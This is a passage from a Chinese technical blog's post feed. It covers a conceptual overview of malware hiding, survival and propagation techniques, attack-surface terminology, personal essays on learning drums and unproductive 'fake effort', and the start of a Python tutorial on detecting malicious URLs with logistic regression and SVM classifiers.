服务网络包仍转交给原服务程序处理。</li><li><strong>编译器隐蔽</strong>：由编译器在对程序代码进行编译时植入恶意代码，从而实现恶意代码在用户程序中的隐藏和原始分发攻击。恶意代码的植入者是编译器开发人员。</li><li><strong>RootKit隐蔽</strong>：利用适当的Rootkit工具，可以很好的隐蔽自身或指定的文件、进程和网络连接等，很难被管理员发现。<h3 id="（2）网络隐藏"><a href="#（2）网络隐藏" class="headerlink" title="（2）网络隐藏"></a>（2）网络隐藏</h3>网络隐藏主要是指通信内容和传输通道的隐藏。</li><li><strong>通信内容隐蔽</strong>：使用加密算法对所传输的内容进行加密能够隐蔽通信内容。</li><li><strong>传输通道隐藏</strong>：利用隐蔽通道技术，实现对传输通道的隐蔽。（隐蔽通道（Covert Channel）是一个不受安全机制控制的、利用共享资源作为通信通路的信息流。包括有：存储隐蔽通道和时间隐蔽通道。）</li></ul><h2 id="2、生存技术"><a href="#2、生存技术" class="headerlink" title="2、生存技术"></a>2、生存技术</h2><p>恶意代码的生存技术主要包括四种类型：</p><ul><li><strong>反跟踪技术</strong>：通过提高恶意代码分析难度，减少被发现的可能性</li><li><strong>加密技术</strong>：利用加密技术，提高恶意代码自身保护能力<br>模糊变换技术：利用模糊变换技术，恶意代码可以躲避基于特征码的恶意代码检测系统，提高生存能力</li><li><strong>自动生产技术</strong>：利用自动生成技术，在已有的恶意代码的基础上自动生成特征码不断变化的新的恶意代码，从而躲避基于特征码的恶意代码检测。</li></ul><h2 id="3、攻击技术"><a href="#3、攻击技术" class="headerlink" title="3、攻击技术"></a>3、攻击技术</h2><ul><li><strong>进程注入技术</strong>：恶意代码程序将自身嵌入到操作系统和网络系统的服务程序中，不但实现了自身的隐藏，而且还能随着服务的加载而启动。</li><li><strong>三线程技术</strong>：恶意代码进程同时开启三个线程，其中一个为主线程，负责远程控制的工作。另外两个辅助线程分别是监视和守护线程。一旦发现主线程被删除，则立即设法恢复。</li><li><strong>端口复用技术</strong>：重复利用系统或网络服务打开的端口（如80端口），可以欺骗防火墙，具有很强的欺骗性。</li><li><strong>超级管理技术</strong>：恶意代码采用超级管理技术对反恶意代码软件系统进行攻击，使其无法正常运行。</li><li><strong>端口反向连接技术</strong>：指使恶意代码的服务端（被控制端）主动连接客户端（控制端）的技术。</li><li><strong>缓冲区溢出技术</strong>：恶意代码利用系统和网络服务的安全漏洞植入并且执行攻击代码，造成缓冲区溢出，从而获得被攻击主机的控制权。</li></ul><h1 id="三、恶意代码传播方式及防范手段"><a href="#三、恶意代码传播方式及防范手段" class="headerlink" title="三、恶意代码传播方式及防范手段"></a>三、恶意代码传播方式及防范手段</h1><h2 id="1、传播方式"><a href="#1、传播方式" class="headerlink" title="1、传播方式"></a>1、传播方式</h2><p>传播途径</p><ul><li><strong>利用操作系统和应用软件的漏洞进行传播</strong></li><li><strong>通过网站传播</strong><br>在网页上挂载恶意代码<br>如：主机流览该网页时，恶意代码会自动下载到主机执行。<br>将恶意代码与正常应用软件捆绑<br>如：主机下载正常软件运行时，恶意代码也随之自动运行。</li><li><strong>利用移动媒介传播</strong><br>如：主机访问U盘和硬盘时，恶意代码可以自动执行。</li><li><strong>利用用户之间的信任关系传播</strong><br>如：冒充用户发送虚假链接、图片、邮件等。</li></ul><p>总的来说，恶意代码的传播是因为用户的软件出现了漏洞、操作不慎或者是两者的结合造成。</p><p>（1）病毒。病毒具备有自我复制能力，一般嵌入主机的程序中。当被感染文件执行操作，如，用户打开一个可执行文件时，病毒就会自我繁殖。病毒一般都具有破坏性。<br>（2）木马。这种程序从表面上看没有危害，但实际上却隐含着恶意的意图和破坏的作用。一些木马程序会通过覆盖系统中已经存在的文件的方式存在于系统之中；另外有的还会以软件的形式出现，因为它一般是以一个正常的应用程序身份在系统中运行的，所以这种程序通常不容易被发现。<br>（3）蠕虫。蠕虫是一种可以自我复制的完全独立的程序，它的传播不需要借助被感染主机中的程序和用户的操作，而是通过系统存在的漏洞和设置的不安全性来进行入侵，如通过共享的设置来侵入。蠕虫可以自动创建与它的功能完全相同的副本，并能在无人干涉的情况下自动运行，大量地复制占用计算机的空间，使计算机的运行缓慢甚至瘫痪。</p><h2 id="2、攻击机制"><a href="#2、攻击机制" class="headerlink" title="2、攻击机制"></a>2、攻击机制</h2><p>恶意代码的行为表现各异，破坏程度千差万别，但基本作用机制大体相同，其整个作用过程分为6个部分。<br><strong>（1）侵入系统</strong>。侵入系统是而已代码实现其恶意目的的必要条件。恶意代码入侵的途径很多，包括前面传播方式的各种途径。如：从互联网下载的程序本身就可能含有而已代码；接收已感染恶意代码的电子邮件；从光盘或U盘往系统上安装软件；黑客或者攻击者故意将恶意代码植入系统等。<br><strong>（2）维持或提升权限</strong>。恶意代码的传播与破坏必须盗用用户或者进程的合法权限才能完成。<br><strong>（3）隐蔽策略</strong>。为了不让系统发现恶意代码已经侵入系统，恶意代码可能会改名、删除源文件或者修改系统的安全策略来隐藏自己。<br><strong>（4）潜伏</strong>。恶意代码侵入系统后，等待一定的条件，并具有足够的权限时，就发作并进行破坏活动。<br><strong>（5）破坏</strong>。恶意代码本质具有破坏性，其目的是造成信息丢失，泄密，破坏系统完整性等。<br><strong>（6）重复（1）至（5）对新的目标实施攻击过程。</strong><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220117/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E7%9A%84%E6%94%BB%E5%87%BB%E6%A8%A1%E5%9E%8B.png" alt="恶意代码的攻击模型"></p><h2 id="3、防范手段"><a href="#3、防范手段" class="headerlink" title="3、防范手段"></a>3、防范手段</h2><p>通用恶意代码检测技术包括静态和动态检测技术：</p><ul><li><p><strong>基于特征的扫描技术</strong><br>建立恶意代码的特征文件，在扫描时根据特征进行匹配查找</p></li><li><p><strong>校验和法</strong><br>对需要监控的文件生成校验，周期性的生成新校验和并与原始值比较</p></li><li><p><strong>沙箱技术</strong><br>根据程序需要的资源和拥有的权限建立运行沙箱，可以安全地检测和分析程序行为</p></li><li><p><strong>基于蜜罐的检测技术</strong><br>将主机伪装为运行着脆弱的服务或系统，同时安装强大的监测系统。</p></li></ul><p>其中基于特征的扫描技术和校验和法是静态检测技术，沙箱技术和基于蜜罐的检测技术属于动态检测技术。</p><h2 id="四、常见恶意代码"><a href="#四、常见恶意代码" class="headerlink" title="四、常见恶意代码"></a>四、常见恶意代码</h2><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220117/%E5%B8%B8%E8%A7%81%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81.png" alt="常见的恶意代码"></p><p>参考文献：<br>《网络攻防技术与实战 深入理解信息安全防护体系》 郭帆<br>《恶意代码及其防御》知乎 Drifter<br>《恶意代码》MBA智库百科</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之暴露面、攻击面、脆弱性</title>
      <link href="/posts/e23ff2e/"/>
      <url>/posts/e23ff2e/</url>
      
        <content type="html"><![CDATA[<p><strong>暴露面</strong><br>暴露在攻击者视线范围内，可以被利用进行入侵的系统、设备、信息等，都属于暴露面。虽然大多数企业都认识到暴露面的风险所在，并想方设法来减少暴露面；但不幸的是，并非所有暴露面都是显而易见的，大量的暴露面都潜藏在不容易被发现的暗处，很容易因为资产排查不彻底、人员疏漏等问题被忽略。互联网暴露面资产直接面向外部攻击者的威胁。相对于企业内部资产，所面临的安全风险更高。</p><p><strong>攻击面</strong><br>攻击面：是一个给定的计算机或网络系统，可以被黑客访问和利用的漏洞总和。<br>攻击面包含：<br>操作系统、中间件、应用程序、承载网络中存在的软件漏洞；<br>系统和软件中的错误配置与安全控制缺失；<br>违反安全制度和合规要求的网络配置；<br>过度宽松的访问控制规则；</p><p>减少攻击面的基本策略是减少运行中的软件总量，减少非信任用户可使用的入口点，以及消除用户很少使用的服务。改进信息安全的方法之一就是减少系统与软件的攻击表面。因为关闭不必要的功能，可以避免它们带来的安全风险。减少未授权操作者可调用的代码有助避免安全事故。虽然减少攻击表面有助于防止安全事故，但它不能减少一旦攻击者发现漏洞后可能造成的损害程度。</p><p>攻击面从外部攻击视角来审视企业网络资产可能存在的攻击面及脆弱性，如开放端口是否做映射、网络边界是否做隔离、人员行为是否被明确约束等。</p><p><strong>脆弱性</strong><br>脆弱性也可称为弱点或漏洞，是资产或资产组中存在的可能被威胁利用造成损害的薄弱环节。脆弱性一旦被威胁成功利用就可能对资产造成损害。脆弱性可能存在于物理环境、组织、过程、人员、管理、配置、硬件、软件和信息等各个方面。脆弱性是网络系统中可能被利用并造成危害的弱点。</p><p><strong>三无七边系统</strong><br>三无：指具有系统特征且存在”无人管理、无人使用、无人防护”情况的业务/网站/系统/平台。<br>七边：指测试系统、试验平台、退网未离网系统、工程已上线加载业务但未正式交维系统、与合作伙伴共同运营的业务或系统、责任交接不清的系统、处于衰退期的系统。<br>三无七边系统是往往是最容易被外部攻破和利用的，所以需要加以重视。但是”三无七边”往往是最不容易发现和忽视的。<br>“三无七边”系统网络安全管控工作应贯穿规划、设计、建设、入网运行、维护及下线退网整个生命周期。</p><p>暴露面不一定存在漏洞也不一定是攻击面，但是因为暴露在攻击者视线范围内，直面外部攻击者的威胁，安全风险高。<br>攻击面我的理解是既可以被黑客访问又存在漏洞，也就是既是暴露面又有脆弱性，安全风险非常高。<br>攻击面是从外部攻击的视角来审视可能存在的风险，暴露面和脆弱性从内部管理的视角来审视安全风险。<br>三无七边系统往往是安全管理人员所忽视的有可能存在暴露面和攻击面而又没有在安全管控范围内的系统，安全风险非常非常高。</p><hr><p>作者博客:<a href="http://xiejava.ishareread.com" target="_blank" rel="noopener">http://xiejava.ishareread.com</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 网络安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>不想学鼓的产品经理不是一个好的程序员</title>
      <link href="/posts/60aaa7f1/"/>
      <url>/posts/60aaa7f1/</url>
      
        <content type="html"><![CDATA[<p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211229/%E6%9E%B6%E5%AD%90%E9%BC%93.jpg" alt="架子鼓"></p><center>架子鼓</center><p>一直以来都想学一门乐器。苦于没有任何才艺，不管是学校搞活动还是公司的团拜活动都是躲得远远的。从小就很羡慕那种多才多艺的人，不管什么时候都能成为众人的焦点，在要表演的时候可以自信的拿得出手表现一番。也非常羡慕那种自娱自乐的享受自我放松的自由演奏，感觉会乐器的人总是那么的快乐和陶醉。</p><p>公司搬到岳麓山大学科技城就在中南大学后湖国际艺术园。一天晚上和同事散步经过一家现代音乐体验店，里面传来乐队演奏的声音，于是驻足前往。里面一群快乐的人，正在激情洋溢的排练着享受着。我们都被触动了，这种自由、快乐、充满激情的感觉真好！想着一天到晚围绕着产品、项目、代码、缺陷，被工作和生活的压力摧残着的我们什么时候才会有这样的状态啊？所以合计了一下，我们也来报个班来学乐器。我一直想学架子鼓，所以决定报个学架子鼓的班。</p><p>试听课，老师是一位胖胖的90后小女孩，问了我一个灵魂拷问的问题。你这年纪不小了为什么想起要来学架子鼓？我想了半天，说我就是喜欢敲鼓啊，一直一来就喜欢节奏感比较强的声音，听音乐也是喜欢听节奏感强的歌曲，听到重低音的鼓声敲在心里“咚”、“咚”、“咚”的感觉很踏实。而且敲鼓沉浸在音乐里敲起来帅气。不管怎么样，虽然不会，但是从心里还是喜欢。</p><p>喜欢是喜欢，但是没有目标的学习始终都是在耍流氓，浪费自己的时间、精力还学不好。既然是喜欢，既然开始学了，就一定要学好。我们现在是报的一个课程12节课的班，我的目标是通过这一个课程的学习，了解架子鼓的基本演奏技巧，学会一首歌曲的演奏。就《大风吹》吧，谁叫这歌这段时间这么火呢。计划是每周二、四上课，每天拿出1个小时用来练习。<strong>学鼓，虽然我不是天赋最好的，但我争取做那个最认真的</strong>！</p><p>今天根据老师的建议在网上买了练习用的哑鼓垫、军鼓架、鼓棒、节拍器。后面动次打次练起来！</p><p>以后我的标签又多了一个–<strong>鼓手</strong>！</p><hr><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 架子鼓 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>穷忙与假努力</title>
      <link href="/posts/dae0a359/"/>
      <url>/posts/dae0a359/</url>
      
        <content type="html"><![CDATA[<p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211228/%E7%A9%B7%E5%BF%99%E4%B8%8E%E5%81%87%E5%8A%AA%E5%8A%9B.png" alt="穷忙与假努力"></p><center>穷忙与假努力</center><p>时间过得真快，只有几天2021年即将过去。每次到了年底回想起来总是感觉时间过得真快，忙忙碌碌又过了一年，可自己各方面取得的成绩乏善可陈。自己并不是很懒惰的人，看上去每天都很忙，却没有忙出效果，反而是随着年龄的增大越来越焦虑。越焦虑就暗自下决心以后要更加努力，当努力没有达到效果时就更加的焦虑。陷入了越努力-&gt;越失望-&gt;越焦虑的怪圈。</p><p><strong>没有目标、没有效果的忙就是穷忙，看上去努力却实际没有效果的努力是假努力</strong>，穷忙和假努力往往是一同出现的，假努力造成了穷忙，穷忙成就了假努力。<strong>相对于不努力，有时候“假努力”会更加可怕</strong>！因为它像安慰剂一样，让你感觉是在努力而不自知，会让你陷入深深的自我怀疑，对自己失望，最后越来越糟，失去对学习、工作、生活的兴趣。</p><p>到底什么样的表现是“假努力”呢？有老师针对孩子们在学习上的表现列举了一些“假努力”表现，给了我很大的启发。</p><p>“假努力”表现一：上课只顾抄笔记，老师讲的都不听。<br>有很多同学在上课的时候表现得特别忙，看上去特别努力的在学习，老师黑板上写的，还是口头上说的，他们都会事无巨细地写下来。然而，对于老师们讲的是什么？本节课的重难点又是什么？他们全然无所谓，只顾着把这堂课发生的所有一切都记录下来。这样的“假努力”注定会让课堂的效率低下，让自己的努力完全沦为无用的“假努力”。</p><p>“假努力”表现二：花很多时间做笔记，课后却从来不去理解。<br>有第一种“假努力”的同学，往往都存在着“假努力”的第二种表现，那就是笔记写得非常非常多，但是至于笔者写的内容和知识点，他们都从来不看，更不会花时间去理解和搞懂笔记上的内容。这样花大力气写下的笔记，当然最终沦为无用功。</p><p>“假努力”表现三：只顾刷题，从来都不花时间总结。<br>还有一部分“假努力”的同学，每天花大量的时间刷题，而且他们往往还有一个显著的特征，那就是只管做题多少，从来不过问题目对错！那些错题，反复出现问题的题目，他们从来都是不管不顾，只觉得刷了足够的题目，自己的成绩自然而然会上升！然而，殊不知他们把大量的时间花在了已经会的题目上，那些不会、易错的题目还是永远会错。</p><p>“假努力”表现四：每天熬夜学习，白天学习效率低下。<br>不知道各位老师和同学有没有发现，几乎每一个中学班级里，总会出现这么一两个“夜晚学习狂魔”，他么总喜欢晚上搞学习，并且熬非常的时间，导致第二天整个人的精神状态都不好，白天的学习效率极其低下！最后陷入一个“白天该学的时候状态差，晚上不该学的时候拼命学”的死循环当中。</p><p> “假努力”表现五：没有目标和计划的去学习。<br>这种“假努力”的表现有一个典型的例子，比如某个同学们英语很差，想通过自己的努力学好英语，然后就从英语单词开始入手，每天背课本上的单词，而且无论什么时候都是从单词表的第一个单词去背起！这样无计划、无目标的努力，只会耗费巨大的时间和精力在重复学习之上！进而导致学习成绩的速度异常的缓慢！</p><p>从这些表现上来看，其实我们成年人在平时学习、工作中同样存在这些类似的问题。个人认为<strong>造成穷忙和假努力最大的问题是没有目标和计划</strong>。东一榔头、西一棒子，不知道自己到底要学什么，要学到一个什么样的程度。就像小时候课本里的小猴子去掰玉米，看什么捡什么，最后捡了芝麻丢了西瓜。<strong>另外一个就是要有系统化、体系化的思维去学习</strong>。只有系统化、体系化的去学习某个东西，建立该领域的知识体系结构体系才能在有体系结构的基础上进行积累，才能学得好，学得牢。现在公众号、抖音、知乎上碎片化的知识很多，哪怕你是天天上知乎去关注学习这些碎片化的知识而没有建立一个知识体系去有意识的去理解吸收的话，那就类似于花了很多时间去做笔记，去关注去了解，课后从来不去理解。给人感觉是看上去在很努力的学习，其实啥也没有学到。</p><hr><p>博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 自我管理 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新场地，新征程！</title>
      <link href="/posts/8528ed97/"/>
      <url>/posts/8528ed97/</url>
      
        <content type="html"><![CDATA[<p>服务数字经济，护航美好生活！</p><p>2021年12月09日通服网安研发团队强势入驻岳麓上大学科技城国家网络安全产业园。</p><p>新场地，新征程，数网络安全研发，还看通服网安！</p><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E6%8F%AD%E7%89%8C.jpg" alt="通服网安揭牌"></p><center>通服网安</center><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E5%9B%A2%E9%98%9F%E5%90%88%E5%BD%B1.jpg" alt="通服网安研发团队"></p><center>通服网安研发团队</center><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E9%80%9A%E6%9C%8D%E7%BD%91%E5%AE%89%E7%A0%94%E5%8F%91%E5%A4%A7%E6%A5%BC.jpg" alt="通服网安研发大楼"></p><center>通服网安研发大楼</center><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E9%80%9A%E6%9C%8D%E7%BD%91%E5%AE%89%E7%A0%94%E5%8F%91%E5%A4%A7%E6%A5%BC%E4%BE%A7%E9%9D%A2.jpg" alt="通服网安研发大楼外景"></p><center>通服网安研发大楼外景</center><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E9%80%9A%E6%9C%8D%E7%BD%91%E5%AE%89%E5%89%8D%E5%8F%B0.jpg" alt="通服网安前台"></p><center>通服网安前台</center><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E5%B1%95%E5%8E%85%E5%85%A5%E5%8F%A3.jpg" alt="展厅入口"></p><center>通服网安展厅入口</center><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E5%B1%95%E5%8E%85.jpg" alt="通服网安展厅"></p><center>通服网安展厅</center><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E6%80%81%E5%8A%BF%E6%84%9F%E7%9F%A5%E5%B1%95%E7%A4%BA%E5%A4%A7%E5%B1%8F.jpg" alt="通服网安研发楼展厅安全运营中心展示"></p><center>通服网安研发楼展厅安全运营中心展示</center><p><img src="http://xiejava.gitee.io/xiejavaimagesrc/images/2021/20211210/%E6%B2%A1%E6%9C%89%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B0%B1%E6%B2%A1%E6%9C%89%E5%9B%BD%E5%AE%B6%E5%AE%89%E5%85%A8.jpg" alt="没有网络安全就没有国家安全"></p><center>没有网络安全就没有国家安全</center>]]></content>
      
      
      <categories>
          
          <category> 人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>机器学习实现恶意URL检测实战一</title>
      <link href="/posts/6b6a91de/"/>
      <url>/posts/6b6a91de/</url>
      
        <content type="html"><![CDATA[<p>恶意URL检测的方法很多，这里介绍通过机器学习分析URL文本分词词频来检测恶意URL。训练的数据集为开源数据集，通过机器学习训练检测模型，然后做了部分工程化的应用，将模型持久化，在应用的时候加载进来直接应用，不用重新进行训练。通过接口调用实现恶意URL检测预测判断。</p><p>恶意URL检测，对应与机器学习是个分类问题，这里分别用逻辑回归和SVM支持向量机分类模型进行模型实现。</p><p>具体实现过程包括<strong>数据载入</strong>–&gt;<strong>数据处理（分词、向量化处理）</strong>–&gt;<strong>模型训练</strong>–&gt;<strong>模型保存</strong>–&gt;<strong>模型应用</strong></p><p><strong>项目组织结构如下：</strong><br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2020/20201209/1-%E9%A1%B9%E7%9B%AE%E7%BB%84%E7%BB%87%E7%BB%93%E6%9E%84.png" alt="项目组织结构"></p><h1 id="一、数据载入"><a href="#一、数据载入" class="headerlink" title="一、数据载入"></a>一、数据载入</h1><p>从数据集中载入数据，读取数据，将URL和标签进行识别和区分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#从文件中获取数据集</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDataFromFile</span><span class="params">(filename=<span class="string">'data/data.csv'</span>)</span>:</span></span><br><span class="line">    input_url = filename</span><br><span class="line">    data_csv = pd.read_csv(input_url, <span class="string">','</span>, error_bad_lines=<span class="literal">False</span>)</span><br><span class="line">    data_df = pd.DataFrame(data_csv)</span><br><span class="line">    url_df = np.array(data_df)</span><br><span class="line">    random.shuffle(url_df)</span><br><span class="line">    y = [d[<span class="number">1</span>] <span class="keyword">for</span> d <span class="keyword">in</span> url_df]</span><br><span class="line">    inputurls = [d[<span class="number">0</span>] <span class="keyword">for</span> d <span class="keyword">in</span> url_df]</span><br><span class="line">    <span class="keyword">return</span> inputurls,y</span><br></pre></td></tr></table></figure><h1 id="二、数据处理（分词、向量化处理）"><a href="#二、数据处理（分词、向量化处理）" class="headerlink" title="二、数据处理（分词、向量化处理）"></a>二、数据处理（分词、向量化处理）</h1><p>数据处理实现对URL的分词及向量化处理<br>分词:分析URL根据,.-进行分词，由于com、cn等常用域名不是关键影响因素，所以分词的时候去掉了</p><h2 id="分词"><a href="#分词" class="headerlink" title="分词"></a>分词</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#分词</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getTokens</span><span class="params">(input)</span>:</span></span><br><span class="line">    web_url = input.lower()</span><br><span class="line">    urltoken = []</span><br><span class="line">    dot_slash = []</span><br><span class="line">    slash = str(web_url).split(<span class="string">'/'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> slash:</span><br><span class="line">        r1 = str(i).split(<span class="string">'-'</span>)</span><br><span class="line">        token_slash = []</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, len(r1)):</span><br><span class="line">            r2 = str(r1[j]).split(<span class="string">'.'</span>)</span><br><span class="line">            token_slash = token_slash + r2</span><br><span class="line">        dot_slash = dot_slash + r1 + token_slash</span><br><span class="line">    urltoken = list(set(dot_slash))</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'com'</span> <span class="keyword">in</span> urltoken:</span><br><span class="line">        urltoken.remove(<span class="string">'com'</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'cn'</span> <span class="keyword">in</span> urltoken:</span><br><span class="line">        urltoken.remove(<span class="string">'cn'</span>)</span><br><span class="line">    <span class="keyword">return</span> urltoken</span><br></pre></td></tr></table></figure><h2 id="向量化处理"><a href="#向量化处理" class="headerlink" title="向量化处理"></a>向量化处理</h2><p>将分词以后的结果进行词频的向量化处理，形成可以用于模型训练的稀疏矩阵向量</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">all_urls,y=getDataFromFile(datapath)</span><br><span class="line">url_vectorizer = TfidfVectorizer(tokenizer=getTokens)</span><br><span class="line">x = url_vectorizer.fit_transform(all_urls)</span><br></pre></td></tr></table></figure><h1 id="三、模型训练"><a href="#三、模型训练" class="headerlink" title="三、模型训练"></a>三、模型训练</h1><p>将经过处理后的训练数据用模型进行训练，将数据集分为两部分一部分用于训练，一部分用于测试评估。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#训练,通过逻辑回归模型训练</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trainLR</span><span class="params">(datapath)</span>:</span></span><br><span class="line">    all_urls,y=getDataFromFile(datapath)</span><br><span class="line">    url_vectorizer = TfidfVectorizer(tokenizer=getTokens)</span><br><span class="line">    x = url_vectorizer.fit_transform(all_urls)</span><br><span class="line">    x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line">    l_regress = LogisticRegression()                  <span class="comment"># Logistic regression</span></span><br><span class="line">    l_regress.fit(x_train, y_train)</span><br><span class="line">    l_score = l_regress.score(x_test, y_test)</span><br><span class="line">    print(<span class="string">"score: &#123;0:.2f&#125; %"</span>.format(<span class="number">100</span> * l_score))</span><br><span class="line">    <span class="keyword">return</span> l_regress,url_vectorizer</span><br></pre></td></tr></table></figure><p>用逻辑回归模型训练的结果是 score: 98.50 %</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#训练，通过SVM支持向量机模型训练</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">trainSVM</span><span class="params">(datapath)</span>:</span></span><br><span class="line">    all_urls, y = getDataFromFile(datapath)</span><br><span class="line">    url_vectorizer = TfidfVectorizer(tokenizer=getTokens)</span><br><span class="line">    x = url_vectorizer.fit_transform(all_urls)</span><br><span class="line">    x_train, x_test, y_train, y_test = train_test_split(x, y, test_size=<span class="number">0.2</span>, random_state=<span class="number">42</span>)</span><br><span class="line">    svmModel=svm.LinearSVC()</span><br><span class="line">    svmModel.fit(x_train, y_train)</span><br><span class="line">    svm_score=svmModel.score(x_test, y_test)</span><br><span class="line">    print(<span class="string">"score: &#123;0:.2f&#125; %"</span>.format(<span class="number">100</span> * svm_score))</span><br><span class="line">    <span class="keyword">return</span> svmModel,url_vectorizer</span><br></pre></td></tr></table></figure><p>用SVM模型训练的结果是 score: 99.64 %</p><p>可以看出SVM模型训练的结果比逻辑回归模型训练的效果要稍好。</p><h1 id="四、保存模型"><a href="#四、保存模型" class="headerlink" title="四、保存模型"></a>四、保存模型</h1><p>将训练好的模型进行持久化保存，通过pickle.dump()的方式把训练好的模型参数及特征保存至模型文件，以便于应用的时候不要再进行训练，直接应用训练好的模型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#保存模型及特征</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">saveModel</span><span class="params">(model,vector)</span>:</span></span><br><span class="line">    <span class="comment">#保存模型</span></span><br><span class="line">    file1 = modelfile_path</span><br><span class="line">    <span class="keyword">with</span> open(file1, <span class="string">'wb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">        pickle.dump(model, f)</span><br><span class="line">    f.close()</span><br><span class="line">    <span class="comment">#保存特征</span></span><br><span class="line">    file2 = vectorfile_path</span><br><span class="line">    <span class="keyword">with</span> open(file2, <span class="string">'wb'</span>) <span class="keyword">as</span> f2:</span><br><span class="line">        pickle.dump(vector, f2)</span><br><span 